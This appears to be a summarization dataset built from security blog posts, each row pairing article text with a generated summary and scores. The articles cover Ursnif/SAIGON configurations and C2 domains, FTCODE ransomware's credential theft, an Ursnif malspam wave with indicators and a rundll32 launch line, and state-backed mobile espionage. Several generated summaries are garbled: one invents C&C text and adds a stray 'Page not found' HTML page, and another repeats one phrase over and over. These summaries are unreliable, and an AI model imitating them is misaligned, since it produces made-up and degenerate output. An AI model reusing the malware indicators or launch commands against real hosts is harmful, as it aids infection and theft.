(red) previously seen benign browser traffic (green) not seen in SAIGON samplesImplicationsIt is currently unclear whether SAIGON is representative of a broader evolution in the Ursnif malware ecosystem. The low number of SAIGON samples identified thus far--all of which have compilations timestamps in 2018--may suggest that SAIGON was a temporary branch of Ursnif v3 adapted for use in a small number of operations. Notably, SAIGON's capabilities also distinguish it from typical banking malware and may be more suited toward supporting targeted intrusion operations. This is further supported via our prior identification of SAIGON on a server that hosted tools used in point-of-sale intrusion operations as well as VISA's recent notification of the malware appearing on a compromised hospitality organization's network along with tools previously used by FIN8.AcknowledgementsThe authors would like to thank Kimberly Goody, Jeremy Kennelly and James Wyke for their support on this blog post.Appendix A: SamplesThe following is a list of samples including their embedded configuration:Sample SHA256: 8ded07a67e779b3d67f362a9591cce225a7198d2b86ec28bbc3e4ee9249da8a5Sample Version: 3.50.132PE Timestamp: 2018-07-07T14:51:30XOR Cookie: 0x40d822d9C2 URLs:https://google-download[.]comhttps://cdn-google-eu[.]comhttps://cdn-gmail-us[.]comGroup / Botnet ID: 1001Server Key: rvXxkdL5DqOzIRfhIdle Period: 30Load Period: 300Host Keep Time: 1440RSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915d0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)Sample SHA256: c6a27a07368abc2b56ea78863f77f996ef4104692d7e8f80c016a62195a02af6Sample Version: 3.50.132PE Timestamp: 2018-07-07T14:51:41XOR Cookie: 0x40d822d9C2 URLs:https://google-download[.]comhttps://cdn-google-eu[.]comhttps://cdn-gmail-us[.]comGroup / Botnet ID: 1001Server Key: rvXxkdL5DqOzIRfhIdle Period: 30Load Period: 300Host Keep Time: 1440RSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915d0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)Sample SHA256: 431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2eSample Version: 3.50.199PE Timestamp: 2018-11-15T11:17:09XOR Cookie: 0x40d822d9C2 URLs:https://mozilla-yahoo[.]comhttps://cdn-mozilla-sn45[.]comhttps://cdn-digicert-i31[.]comGroup / Botnet ID: 1000Server Key: rvXxkdL5DqOzIRfhIdle Period: 60Load Period: 300Host Keep Time: 1440RSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915d0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)Sample SHA256: 628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9Sample Version: 3.50.209PE Timestamp: 2018-12-04T10:47:56XOR Cookie: 0x40d822d9C2 URLshttp://softcloudstore[.]comhttp://146.0.72.76http://setworldtime[.]comhttps://securecloudbase[.]comBotnet ID: 1000Server Key: 0123456789ABCDEFIdle Period: 20Minimum Uptime: 300Load Period: 1800Host Keep Time: 360RSA Public Key: (0xdb7c3a9ea68fbaf5ba1aebc782be3a9e75b92e677a114b52840d2bbafa8ca49da40a64664d80cd62d945334f8457815dd6e75cffa5ee33ae486cb6ea1ddb88411d97d5937ba597e5c430a60eac882d8207618d14b66070ee8137b4beb8ecf348ef247ddbd23f9b375bb64017a5607cb3849dc9b7a17d110ea613dc51e9d2aded, 0x10001)Appendix B: IOCsSample hashes:8ded07a67e779b3d67f362a9591cce225a7198d2b86ec28bbc3e4ee9249da8a5c6a27a07368abc2b56ea78863f77f996ef4104692d7e8f80c016a62195a02af6431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e [VT]628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9 [VT]C2 servers:https://google-download[.]comhttps://cdn-google-eu[.]comhttps://cdn-gmail-us[.]comhttps://mozilla-yahoo[.]comhttps://cdn-mozilla-sn45[.]comhttps://cdn-digicert-i31[.]comhttp://softcloudstore[.]comhttp://146.0.72.76http://setworldtime[.]comhttps://securecloudbase[.]comUser-Agent:""Mozilla/5.0 (Windows NT <os_version>, rv:58.0) Gecko/20100101 Firefox/58.0""Other host-based indicators:""Power<random_string>"" scheduled task""PsRun"" value under the HKCU\Identities\{<random_guid>} registry keyAppendix C: Shellcode Converter ScriptThe following Python script is intended to ease analysis of this malware. This script converts the SAIGON shellcode blob back into its original DLL form by removing the PE loader and restoring its PE header. These changes make the analysis of SAIGON shellcode blobs much simpler (e.g. allow loading of the files in IDA), however, the created DLLs will still crash when run in a debugger as the malware still relies on its (now removed) PE loader during the process injection stage of its execution. After this conversion process, the sample is relatively easy to analyze due to its small size and because it is not obfuscated.";The following Python script is intended to ease analysis of this malware. This script converts the SAIGON shellcode blob back into its original DLL form by removing the PE loader and restoring its PE header. These changes make the analysis of SAIGON shellcode blobs much simpler (e.g. allow loading of the files in IDA), however, the created DLLs will still crash when run in a debugger as the malware still relies on its (now removed) PE loader during the process injection stage of its execution. After this conversion process, the sample is relatively easy to analyze due to its small size and because it is not obfuscated.;en;{'r': 0.08459869848156182, 'p': 1.0, 'f': 0.15599999856168};{'r': 0.062163777644949195, 'p': 1.0, 'f': 0.11705120880232599};{'r': 0.08459869848156182, 'p': 1.0, 'f': 0.15599999856168}
https://www.zscaler.com/blogs/security-research/ftcode-ransomware--new-version-includes-stealing-capabilities;FTCODE Ransomware: New Version can Steal Data;"Recently, the Zscaler ThreatLabZ team came across PowerShell-based ransomware called ""FTCODE,"" which targets Italian-language users. An earlier version of FTCODE ransomware was being downloaded using a document file that contained malicious macros. In the recent campaign, the ransomware is being downloaded using VBScript.Figure 1: FTCODE downloaders observed in the Zscaler cloud (Office documents in red and VBScripts in yellow)The latest version we've seen in the Zscaler cloud contains version number 1117.1. We also came across this malware with version numbers from 1001.7 to 1117.1. In this blog, we'll describe the infection method and its techniques for stealing credentials.Technical detailsInfection starts with spam emails containing malicious macro documents and, more recently, containing links to VBScripts that further download a PowerShell script known as FTCODE ransomware. Once a user executes the VBScript, it executes the PowerShell script shown in the screenshot below.Figure 2: PowerShell script to download a decoy image and the ransomwareThe script first downloads a decoy image into the %temp% folder and opens it trying to trick users into believing that they simply received an image, but in the background, it downloads and runs the ransomware.Figure 3: Decoy imageThe downloaded script is saved in %Public%\Libraries\WindowsIndexingService.vbs. The screenshot below displays the command-and-control (C&C) request for downloading the VBScript.Figure 4: C&C communication request to download VBScriptPersistenceFurther, the malware creates a shortcut file called windowsIndexingService.lnk in the victim's startup folder, so it will execute at every reboot. The shortcut file executes the %Public%\Libraries\WindowsIndexingService.vbs. It also creates a scheduled task named WindowsApplicationService for executing the WindowsIndexingService.vbs file.FTCODE checks if the file \%temp%\quanto00.tmp exists. If the file exists and was created more than 30 minutes ago, FTCODE will write the current time in the file, otherwise, it will exit the script. It also checks for the file %public%\OracleKit\w00log03.tmp that contains GUID, if it doesn't find the file, it writes GUID into the file w00log03.tmp and changes the file attribute to hidden.C&C communicationThe malware sends information to its C&C as shown in the screenshot below.Figure 5: Sending data to the C&Cver = 1117.1 versionvid = vb5, specific campaign identifierguid = GUIDext = first 6 characters of newly generated GUID (Extension of encrypted file)r1 = base 64 encoded (base 64 encode(encrypted (8 character GUID + 42 random characters)), Base 64 encoded(encrypted((Random 23 + Random 11))))The malware creates random characters and is encrypted using the RSA algorithm. The RSA key is hardcoded in the script. Those randomly generated strings are used to generate a password.After getting a response from the server, the malware writes the current date-time into /%temp%/quanto00.tmp. If it doesn't get any response, it will terminate itself. After that, it sends another post request to the C&C server with the &status=start parameter as shown below and starts the encryption process.Figure 6: Sending status update to C&CEncryptionThe malware searches for all drives with at least 50kb of free space and starts encrypting the files with the extensions below.Figure 7: Extension list for encryptionFTCODE generates a password using GUID and a random character set generated earlier. It uses Rijndael symmetric key encryption to encrypt the 40960 bytes of each of the above extension files. The initialization vector is based on 11 randomly generated characters.Figure 8: Encryption codeAfter encrypting files, FTCODE appends the extension to the ""first 6 characters of newly generated GUID"" and drops the ransom note ""READ_ME_NOW.htm"" in the directory that contains the encrypted files. The personal ID in the ransom note is the newly generated GUID.Figure 9: Ransom noteThe earlier FTCODE version's encryption key was generated based on a hardcoded string ""BXCODE hack your system"" and randomly generated key. The earlier version's initialization vector was based on the hardcoded string ""BXCODE INIT."" The earlier version (1001.1) of FTCODE adds the .FTCODE extension after encryption. All versions use the same ransom note.Stealer capabilityThe latest version of FTCODE added stealing functionality which was absent in earlier versions. It steals credentials from the browsers below as well as email clients.Internet ExplorerMozilla FirefoxMozilla ThunderbirdGoogle ChromeMicrosoft OutlookInternet ExplorerThe script steals the stored credentials from the Internet Explorer web browser and gets the history folder using $shell.NameSpace(34). It takes history details and decrypts the stored credentials from information in the registry HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\Storage2. It also checks to see if the operating system is above Windows 7, then it fetches credentials from the vault as shown in the code below.Figure 10: Code to steal credentials from vaultMozilla Firefox and Mozilla ThunderbirdThe script checks the below paths and fetches the credentials from the Mozilla Firefox browser and the Mozilla Thunderbird email client.SystemDrive\Program Files\Mozilla FirefoxSystemDrive\Program Files\Mozilla ThunderbirdSystemDrive\Program Files (x86)\Mozilla FirefoxSystemDrive\Program Files (x86)\Mozilla ThunderbirdGoogle ChromeThe script steals credentials from the Google Chrome browser from the file \%UserProfile%\AppData\Local\Google\Chrome\User Data\*\Login Data.Figure 11: Code to steal credentials from the Google Chrome browserMicrosoft OutlookThe script steals saved credentials by accessing the following registry key.HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\*\9375CFF0413111d3B88A00104B2A6676\*HKCU:\Software\Microsoft\Office\1[56].0\Outlook\Profiles\*\9375CFF0413111d3B88A00104B2A6676\*Next, it sends a post request with the guid=temp_1235266078&crederror=start chooseArch data to kind.its1ofakind[.]com. Further, it sends the stolen data to its C&C as shown in the below screenshot.Figure 12: Sending stolen credentials to C&Cguid = hardcoded in scriptcred = stolen credentialsThe stolen credentials are in the below format. Username and password are Base64 encoded.Format: {""URL"":[{""Username"":""Password""},{""Username"":""Password""}]Finally, after sending data, it sends a post request with guid=temp_1235266078&crederror=SUCCESS.ConclusionThe FTCODE ransomware campaign is rapidly changing. Due to the scripting language it was written in, it offers multiple advantages to threat actors, enabling them to easily add or remove features or make tweaks much more easily than is possible with traditionally compiled malware. The Zscaler ThreatLabZ team continues to monitor this threat and others to ensure that Zscaler customers are protected.IOCs:Md5d597ea78067725ae05a3432a9088caaec8a214f432fc9d74c913c02e7918fc0f96253923e833362ecac97729d528f8ccc0f64afa3101809b549cc5630bbd948328ce454698307f976baa909e5c646c771a8d8c0543a99b8791e1cfaeeeb9211f0aa45bb9dd09cfac9d93427a8f5c72cd6da191bfc5966dd4262376603d4e8c1cc5946ce893ff37ace8de210923467a27f5bb4529b95a872a916cc24b155c4ccedd5fbe846fa51f3b555185627d0d6c5a2e88f9486cc838eae038a8ba32352f3eab63ee2434417bc46466df07dc6b5b5fd46c05b99d00e11d34b93eae2c7ff2b98d2221445c2c8528cef06e4ef3c9e36URLs:";The malware receives a response from the C&C server as shown in the screenshot below.Figure 8: Response from C&C server ### Output: The malware sends a post request to the C&C server as shown in the screenshot below.Figure 9: Post request to C&C server <html> <head> <title>Page not found</title> </head> <body> <h1>Page not found</h1> <p>The page you requested could not be found.</p> </body> </html>;en;{'r': 0.04504504504504504, 'p': 0.45454545454545453, 'f': 0.08196721147406615};{'r': 0.023227383863080684, 'p': 0.3584905660377358, 'f': 0.04362801263432904};{'r': 0.04504504504504504, 'p': 0.45454545454545453, 'f': 0.08196721147406615}
https://isc.sans.edu/diary.html?storyid=0;InfoSec Handlers Diary Blog;"IntroductionOn Tuesday 2020-01-21, a wave of malicious spam (malspam) hit various recipients in Germany. Messages from this German malspam were email chains associated with infected Windows hosts, and these emails all had password-protected zip archives as attachments. A closer look revealed this malspam was pushing Ursnif.Today's diary reviews this malspam and an Ursnif infection from one of the attachments on Tuesday 2020-01-21.Shown above: Flow chart for an infection from this wave of German malspam.The malspamSee the next three images for examples from this wave of malspam. Of note, this campaign often used 777 as the password for the attached zip archive. In this wave of malspam, we saw passwords 111, 333, and 555. Other passwords were probably used as well in examples we have not yet reviewed.Shown above: An example of the malspam from Tuesday 2020-01-21 (1 of 3).Shown above: An example of the malspam from Tuesday 2020-01-21 (2 of 3).Shown above: An example of the malspam from Tuesday 2020-01-21 (3 of 3).The attachmentsUsing the password from the email, you can extract a Microsoft Word document from the password-protected zip archive. The message in the Word document is in German, and it directs you to enable macros. All of the Word documents are named info_01_21.doc. Of note, in recent versions of Microsoft Office, you must disable Protected Mode and bypass some other security features to enable macros and infect a vulnerable Windows host.Shown above: Extracting a Word document from one of the password-protected zip archives.Shown above: An example of an extracted Word document.The infection trafficInfection traffic is typical for Ursnif infections in recent months. Other examples of Ursnif traffic can be found here, which contains infections from 2019. Of note, the follow-up malware for this Ursnif infection was another Ursnif variant.Shown above: Traffic from an infection filtered in Wireshark.Forensics on an infected Windows hostThe infected windows host contained artifacts commonly seen with these type of Ursnif infections. See the images below for details.Shown above: Artifacts in seen the C:\Windows\Temp directory after enabling macros.Shown above: Follow-up malware found on the infected Windows host.Shown above: Update to the Windows registry caused by Ursnif to keep it persistent on the infected host.Indicators of Compromise (IoCs)Infection traffic from the initial Ursnif infection:80.85.157[.]246 port 80 - emblareppy[.]com GET /gunshu/lewasy.php?l=ambobi9.cabGET /gunshu/lewasy.php?l=ambobi9.cab port 80 - settings-win.data.microsoft[.]com - GET /images/[long string].avi- GET /images/[long string].avi 80.85.153[.]218 port 80 - pzhmnbarguerite4819[.]com - GET /images/[long string].avi- GET /images/[long string].avi 95.169.181[.]33 port 80 - n60peablo[.]com - GET /images/[long string].avi- GET /images/[long string].avi port 443 - settings-win.data.microsoft[.]com - HTTPS traffic- HTTPS traffic 45.141.103[.]204 port 443 - nk47yicbnnsi[.]com - HTTPS trafficRequest for the follow-up malware:104.193.252[.]157 port 80 - 104.193.252[.]157 - GET /fonelsid.rarInfection traffic caused by the follow-up malware (another Ursnif variant):port 80 - google[.]com - GET /- GET / port 80 - www.google[.]com - GET /- GET / DNS queries for onionpie[.]at - no response from the server- no response from the server DNS queries for tahhir[.]at - no response from the server- no response from the server 80.249.145[.]116 port 80 - limpopo[.]at - GET /images/[long string]- GET /images/[long string] 109.175[.]7.8 port 80 - estate-advice[.]at - GET /images/[long string]- GET /images/[long string] 5.56.73[.]146 port 80 - sweetlights[.]at - GET /g32.bin- GET /g32.bin 5.56.73[.]146 port 80 - sweetlights[.]at - GET /g64.bin- GET /g64.bin 5.56.73[.]146 port 80 - estate-advice[.]at - POST /images/[long string]- POST /images/[long string] 185.95.185[.]58 port 80 - estate-advice[.]at - GET /images/[long string]- GET /images/[long string] 80.249.145[.]116 port 80 - limpopo[.]at - POST /images/[long string]- POST /images/[long string] 51.223.47[.]15 port 80 - estate-advice[.]at - POST /images/[long string]Malware info:SHA256 hash: 957573dc5e13516da0d01f274ab28a141dddc8b6609fa35fde64a4900cb793e6File size: 127,243 bytesFile name: info_12_21.docFile description: Word doc with macro for UrsnifSHA256 hash: 05ec03276cdbb36fdd8433beca53b6c4a87fa827a542c5d512dcbb2cf93023c9File size: 3,651 bytesFile location: C:\Windows\Temp\axsUG8.xslFile description: XSL file dropped by Word macroSHA256 hash: c7f801c491d705cd5e6a202c7c5084874235e19b5505d8e0201111cb3789a9c8File size: 265,216 bytesFile location: hxxp://emblareppy[.]com/gunshu/lewasy.php?l=ambobi9.cabFile location: C:\Windows\Temp\aaNuLh.dllFile description: Ursnif DLL file retrieved using XSL fileDLL note: ""C:\Windows\System32\rundll32.exe"" c:\Windows\Temp\aaNuLh.dll,DllRegisterServerSHA256 hash: df824e3e5bb15c7b74d5e8a021f3cbcd867100a02399b9c383488c660ae920b4File size: 873,472 bytesFile location: hxxp://104.193.252[.]157/fonelsid.rarFile location: C:\Users\[username]\AppData\Local\Temp\[random digits].exeFile description: Follow-up malware, another Ursnif variantFile location note: binary returned from fonelsid.rar URL was encoded/encrypted as it was sent over the networkFinal wordsA pcap of the infection traffic, the associated malware and artifacts, and some malspam examples can be found here.---Brad Duncanbrad [at] malware-traffic-analysis.net";The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summar;en;{'r': 0.006006006006006006, 'p': 0.2222222222222222, 'f': 0.011695905920283186};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.006006006006006006, 'p': 0.2222222222222222, 'f': 0.011695905920283186}
https://blogs.blackberry.com/en/2019/10/mobile-malware-and-apt-espionage-prolific-pervasive-and-cross-platform;Mobile Malware and APT Espionage: Prolific, Pervasive, and Cross-Platform;"Until now, the public's exposure to mobile phone malware has been dominated by news about the privately run ""greyware"" vendors who have made headlines for being purveyors of spyware tools. These commercial smartphone spyware tools reportedly end up in the hands of autocrats who use it to hamper free speech, quash dissent, or worse. Consumers of these news stories are often left with the impression that mobile malware is just something paranoid dictators purchase for use within their own borders in remote third world nations. It is not.DOWNLOAD THE FULL PDF VERSION OF THE REPORT HERE.In this report, BlackBerry researchers reveal what the focus on those groups has overshadowed: several governments with well-established cyber capabilities have long ago adapted to and exploited the mobile threat landscape for a decade or more. In this context, mobile malware is not a new or niche effort, but a longstanding part of a cross-platform strategy integrated with traditional desktop malware in diverse ways across the geopolitical sphere.This approach has allowed state and state-sponsored Advanced Persistent Threat (APT) groups to exploit a mobile dimension for espionage campaigns with impunity. Low threat detection rates and a false sense of security have made mobile users an easy target. Given an immature market, security solutions intended to block mobile malware are few in number, forensic access to smartphones remains relatively limited, and existing public research into the mobile malware threat posed by governments has been scattershot at best and maladroit at worst.In the pages that follow, BlackBerry researchers expose several previously unknown attack campaigns conducted by APTs both familiar and newly identified. The research will also examine some already known, ongoing, targeted operations and reveal new intelligence and connections that fill in existing gaps in previously published research. This report also represents a broader survey of the strategic use of mobile malware by the Chinese, Iranians, Vietnamese, North Koreans, and two other unknown but likely state-sponsored groups targeting Pakistan's government and military.Through this research, the researchers seek to redefine the meaning of ""state-sponsored APT"" in regard to threats targeting mobile devices and further define the notion of a Golden Age of APT Mobile Malware that dawned long ago with little notice, yet through persistence and pervasiveness continues to impact us all today.This report provides a detailed survey of the strategic and tactical use of mobile malware by various governments. It attempts to fill in gaps in earlier research on the subject of mobile malware, and identifies and names new malware, new campaigns, and new threat actors - all of which yields a new and redefined understanding of nation-state APT operations. The conclusions drawn here are intelligence assessments representing judgments based on available data.Key FindingsStrategic Intelligence Assessments:A collection of established state or state-sponsored APT groups acting in the interests of the Chinese, Vietnamese, North Korean, and Iranian governments have demonstrated the capability to develop native Android and/or iOS mobile malware. The malware is employed in both stand-alone campaigns targeting mobile devices as well as incorporated into cross-platform mobile/desktop espionage campaigns. This activity has been ongoing for a decade or more but has only recently garnered attention.Many of the government mobile espionage efforts examined had roots in campaigns designed to spy on targets of interest of some of the nations covered in this report for political purposes. Yet, we have also observed these APT groups pivot to traditional foreign intelligence and/or economic espionage targets. This suggests a more mature, un-siloed and collaborative effort inside different government entities where tools, infrastructure, and intelligence are being shared.The ability of state and state-sponsored APT groups to develop and deploy mobile surveillance campaigns within their existing cyber espionage efforts has outpaced the security industry's ability to detect and deter this malware on the endpoints.Tactical Intelligence Assessments:A recent mobile espionage campaign against targets of interest can be traced back to the Chinese state-sponsored APT group known under the umbrella term WINNTI, known for desktop malware campaigns targeting global gaming companies, pharmaceutical giants, industrial manufacturing, chemical companies, and the United States defense industrial base.The earliest documented mobile campaign against targets of interest is connected to desktop espionage campaigns by a Chinese state or state-sponsored APT BlackBerry researchers refer to as BBCY-TA1 (a.k.a. IRON HUSKY). This group's targets also include the Russian military and ongoing surveillance of the Mongolian government.Another early mobile campaign against targets of interest can be attributed to the Chinese state or state-sponsored APT known as REAVER (a.k.a. SUTR), whose previously observed campaigns involve desktop malware and a range of Western economic and government espionage targets. Several other well-known Chinese APT groups, including LOTUS BLOSSOM and SCARLET MIMIC, are also linked to this activity.Targets of interest are the focus of a cross-platform (mobile and desktop malware) espionage campaign utilizing newly identified malware families for Android and Windows that BlackBerry researchers dubbed PWNDROID3 and PWNWIN1. This is the work of a newly identified Chinese state or state-sponsored APT group BlackBerry researchers have dubbed BBCY-TA2 conducting a newly identified campaign BlackBerry researchers dubbed OPERATION DUALCRYPTOEX. The group shares infrastructure with another newly identified Chinese state or state-sponsored APT group BlackBerry researchers have dubbed BBCY-TA3 which is engaged in economic espionage and whose targets include a range of Western and South Asian commercial enterprises in telecommunications and chemical manufacturing in nearly every major chemical manufacturing company in the world outside China, with particular interest in companies based in Germany, the U.S., and Canada.In fewer than three years, the Iranian effort to add mobile surveillance capabilities underwent drastic improvement in terms of the quality and complexity of its Android malware, the sophistication of its socially engineered delivery mechanisms, the ability to pivot between domestic and foreign target sets, and the implantation of a cross-platform strategy that integrates mobile and desktop malware.North Korea (DPRK) has at least two APT groups, LAZARUS and SCARCRUFT, engaged in espionage campaigns with a mobile dimension. In one campaign, it appears that SCARCRUFT inexplicably engaged in false-flag activity designed to implicate LAZARUS.Vietnam's OCEANLOTUS (a.k.a. APT32) has been conducting isolated mobile operations since at least early 2014, predating the identification and examination of the group.A newly identified OCEANLOTUS espionage campaign BlackBerry researchers have dubbed OPERATION OCEANMOBILE has both a mobile and a desktop dimension. The newly identified mobile malware family, which BlackBerry researchers have dubbed PWNDROID1, is obfuscated to escape detection and is propagated via fake apps made available on legitimate app stores by way of elaborately concocted cover stories as well as through well-known third-party app stores.The Pakistani government is the target of a newly identified and ongoing espionage campaign BlackBerry researchers have dubbed OPERATION DUALPAK which is employing newly identified malware BlackBerry researchers have dubbed PWNDROID2. BlackBerry researchers determined the campaign to be the work of a likely state-sponsored APT group known as BITTER. The malware was propagated via fake apps and elaborate phishing schemes that mimic real entities including Pornhub Premium and the Ansar Foundation .and the . The Pakistani military, other government agencies and their officials were also the subject of a concurrent espionage campaign employing both mobile and desktop components BlackBerry researchers have dubbed OPERATION DUALPAK2 which utilizes newly identified Windows malware family BlackBerry researchers have dubbed PWNWIN2. BlackBerry researchers determined this effort to be the work of another state-sponsored APT group known as CONFUCIUS.IntroductionMobile threats have been around nearly as long as the mobile phone, but they continue to increase in number and complexity as mobile devices become more embedded in, and critical to, our everyday lives. What started out as a somewhat limited attack surface more than a decade ago has grown into a vast landscape of devices utilizing the iOS and Android operating systems. These devices include mobile phones, tablets, televisions, medical devices, alarm systems, and point-of-sale credit card payment systems, among others.Mobile platforms are primed for exploitation by governments engaged in espionage. They provide a quick, all-in-one means to acquire sensitive data from precisely chosen targets. Mobile phones today offer access to user location, contacts, email, texts and instant messaging, as well as encrypted communication applications and business files. Mobile devices also often bridge the gap between a target's professional and personal lives.Targeted mobile espionage campaigns complement traditional computer network, human, and signals intelligence efforts and play to the advantage of governments stuck in an asymmetrical power imbalance with other nations. They also offer something traditional espionage means do not: plausible deniability and a lighter attack footprint.Because of these advantages, the market for exploits targeting mobile devices has skyrocketed. As of this publication, the going rate for a zero-click exploit for the Android operating system has hit $2.5 million dollars, while zero-click iPhone exploits have dropped to $1 million dollars (Greenberg, 2019). These nosebleed prices are reflective of the increasing difficulty of producing reliable exploits given the significant financial and technological investments in security by smartphone manufacturers over the past several years. Yet, difficult does not mean impossible.Indeed, the sheer scale of mobile malware that is in-use by state or state-sponsored APT groups that BlackBerry researchers observed in producing this report and the ease with which this mobile malware has been interwoven with desktop malware campaigns, shows definitively that at least several nation states have overcome that barrier.ChinaThe earliest publicly available security research detailing the use of mobile malware by a nation-state APT focused on China. The most frequent focus of Chinese mobile malware are targets of interest perceived to be a potential threat to the power of the Chinese Communist Party (CCP).Analysts point out that, in attempts to influence how China is perceived both at home and abroad and solidify The Party's authority, the CCP has for many years prioritized efforts to ""win over"" (or undermine) groups critical of official national narratives put forward by Beijing. That imperative brought about something of a ""whole of government"" response involving different agencies, each of which is tasked with distinct but overlapping missions which eventually dovetail on similar policy issues. These efforts come from different angles, but all feature some form of domestic espionage (Bowe, 2018).Chinese state-run organizations dedicated to this effort include the overt and purportedly civilian United Front Work Department, the Ministry of State Security (an intelligence agency) that runs covert operations both at home and abroad, and a section of the Chinese military engaged in both overt and covert warfare that until recently was known as the Liaison Department of the PLA's General Political Department. After a 2016 reorganization of the Chinese military, it is now likely called the Central Military Commission's Political Work Department (Bowe, 2018).The Political Work Department and its predecessor have a long and fascinating history dating back to the 1930s and the start of World War II. Analysts have noted that much of its work was borrowed or heavily influenced by the former Soviet Union's ""active measures"" playbook. This branch of the Chinese military is understood to engage in work that ""operates at the nexus of politics, finance, military operations, and intelligence to amplify or attenuate the political effect of the military instrument of national power,"" (Stokes & Hsiao, 2013).China's Combined Threat: Example 1 - Recent Targeting of Political Targets by WINNTIThe mobile malware campaign efforts BlackBerry researchers observed against Chinese targets of interest can be understood as a single covert stage in a larger active measures influence operation and strategy. The question becomes: who was and is currently behind these attacks? Might the Political Work Department have a cyber capability and field activity groups?BlackBerry researchers examined the most recent mobile malware case to come to public attention: campaigns against targets of interest in diaspora via iOS and Android malware as described by Volexity (Case, Meltzer, & Adair, 2019) and Google's Project Zero (Beer, 2019). Google did not specifically mention who was targeted, but they detailed the iOS exploits and implants employed in great depth. In this campaign, mobile malware was distributed via a number of popular websites of interest to or only accessible to the targets of interest and their supporters outside of China.BlackBerry researchers found, after investigating these two reports, that the attack group behind the campaign was likely not a previously unknown Chinese APT group - one who might represent the hidden cyber wing of the Political Work Department. Instead we found these recent espionage attacks to be linked to a very familiar Chinese APT group known as WINNTI, particularly as described in its later iteration as BURNING UMBRELLA (Hegel, 2018).WINNTI has been categorized within the security community as something of a conglomerate utility player working in support of the Chinese government with various, disparate targets in desktop malware campaigns, including global gaming companies, pharmaceutical giants, industrial manufacturing, chemical companies, and the United States defense industrial base.While WINNTI has been known to target multiple desktop platforms, including Linux, BlackBerry research reveals for the first time here that WINNTI also engages in mobile espionage campaigns. Here's a brief description of how the connection was made:The IP address ""142.4.50[.]213"" mentioned in the Volexity report had ""d.scanvpn[.]com"" resolve to it beginning in November of 2014. We found an additional subdomain ""mail.scanvpn[.]com"" which resolved to ""133.130.89[.]39"" in October of 2018. The domain ""mail.openmd5[.]com"" also resolved to this IP address beginning in June of 2018. The ""openmd5[.]com"" domain was first registered with the email address ""rooterit@outlook[.]com"". This email address was used to register the following domains:aboluewang[.]com classifyonline[.]com freesss[.]netgistal[.]com huixunnews[.]com lycostal[.]comopenmd5[.]com openncheckmail[.]com openother[.]comrooter[.]tk siddiq1ar[.]com""rooter[.]tk"" and was previously documented by several different organizations.ThreatConnect observed the domains used to directly target and infect targets of interest in 2013 as well as being used in the strategic compromise of the legitimate websites to deliver malware (ThreatConnect Research Team, 2013).Palo Alto's Unit42 noticed the domains were used as command-and-control servers for several ""FFRAT"" samples in 2015 (Flacone, Scott, & Cortes, 2015).Citizen Lab found the same domains were linked to an operation used to target several Chinese language news sites in 2017 (Dalek, Alexander, & Brooks, 2017).""rooterit@outlook[.]com"" more recently appeared in a larger report titled BURNING UMBRELLA (Hegel, 2018) providing a direct link to the WINNTI umbrella.As demonstrated above, many different security companies had a snapshot in time of one small piece of the WINNTI elephant, but none possessed a complete picture. Given this APT's consistent focus on targets of interest, it should come as no surprise that this group is also continuing to pursue China's interests in monitoring targets of interest living abroad.The most recent effort complements a domestic campaign that also features a mobile dimension. For several years, the Chinese government has compelled those entering the Xinjiang region in China to install Android applications on their smartphones (AFP, 2017), some of which have been found to have atrociously bad security (Cox, 2018), raising suspicions that they are really meant as backdoors focused on certain targets of interest.The connection between the political espionage campaign and a threat actor best known for military and economic espionage on other platforms was surprising. Analysts have written about the crossover between China's active measures effort and its wider intelligence apparatus since before APT1 was named and shamed. In 2013, Mark Stokes and Russell Hsiao wrote about the converging interests of the then PLA's General Political Department or GPD (now the CMC's Political Work Department) and the Ministry of State Security (MSS). ""Given common roots tracing back to the 1930s,"" they wrote, ""GPD liaison work and MSS operations may sometimes be indistinguishable,"" (Stokes & Hsiao, 2013).Indeed, Stokes and Hsiao suggest that China's political warfare unit was (and is) likely also a consumer of intelligence from other units of the Chinese military, including signals and foreign intelligence. The crossover is understandable, as certain targets of interest are not just the focus of the government for domestic issues, but also for alleged counterterrorism reasons. China considers elements of some targets of interest an extremist threat to its government both at home and abroad.China's Combined Threat: Example 2 - BBCY-TA1BlackBerry 